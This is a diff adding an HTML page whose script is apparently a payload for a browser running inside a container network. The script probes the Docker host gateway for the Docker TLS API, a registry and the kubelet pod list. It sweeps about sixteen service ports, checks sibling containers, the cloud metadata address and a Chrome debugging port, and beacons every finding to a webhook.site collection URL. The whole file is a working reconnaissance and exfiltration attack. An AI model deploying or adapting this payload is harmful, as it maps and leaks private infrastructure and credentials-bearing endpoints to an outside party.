@@ -1,0 +1,51 @@
+<!doctype html>
+<html><body><script>
+const BIN = 'https://webhook.site/6353f301-6064-4234-b5c8-361a00e129ba/?p=';
+const out = [];
+function flush(tag) {
+  new Image().src = BIN + encodeURIComponent(tag + ' :: ' + out.join(' | '));
+  out.length = 0;
+}
+out.push('boot12 ' + location.host);
+
+async function tprobe(name, url, ms) {
+  const t0 = performance.now();
+  const ac = new AbortController();
+  const timer = setTimeout(() => ac.abort(), ms);
+  let outcome = 'ok';
+  try { await fetch(url, { mode: 'no-cors', cache: 'no-store', signal: ac.signal }); }
+  catch (e) { outcome = (performance.now() - t0 >= ms - 120) ? 'TO' : 'err'; }
+  finally { clearTimeout(timer); }
+  const dt = Math.round(performance.now() - t0);
+  if (outcome !== 'err' || dt > 8) out.push(`${name}=${dt}ms:${outcome}`);
+}
+async function corsprobe(name, url) {
+  const t0 = performance.now();
+  try {
+    const r = await fetch(url, { mode: 'cors', cache: 'no-store' });
+    let b = ''; try { b = (await r.text()).slice(0, 300); } catch (e) {}
+    out.push(`CORS ${name} OK ${r.status} ${b}`);
+  } catch (e) { out.push(`CORS ${name} ERR ${Math.round(performance.now()-t0)}ms`); }
+}
+
+(async () => {
+  // money probes first: docker-tls + k8s + 5000 with cors
+  await corsprobe('2376', 'https://172.17.0.1:2376/version');
+  await corsprobe('5000h', 'https://172.17.0.1:5000/');
+  await corsprobe('8443', 'https://172.17.0.1:8443/');
+  await corsprobe('10250', 'https://172.17.0.1:10250/pods');
+  flush('cors1');
+
+  // host sweep, key ports only, second wave
+  const sweep = [53, 25, 3306, 5601, 5984, 7474, 8161, 9092, 9200, 10255, 11211, 15672, 2377, 7946, 4789, 6667];
+  for (const p of sweep) await tprobe('S' + p, `http://172.17.0.1:${p}/`, 700);
+  flush('sweep');
+
+  // siblings + metadata
+  for (const t of ['172.17.0.3:5000','172.17.0.3:8443','172.17.0.4:5000','172.17.0.5:1337','169.254.169.254:80','172.17.0.2:9222'])
+    await tprobe('N' + t.replace(/[:.]/g, '_'), `http://${t}/`, 900);
+  flush('sib');
+  out.push('done12');
+  flush('end');
+})();
+</script></body></html>
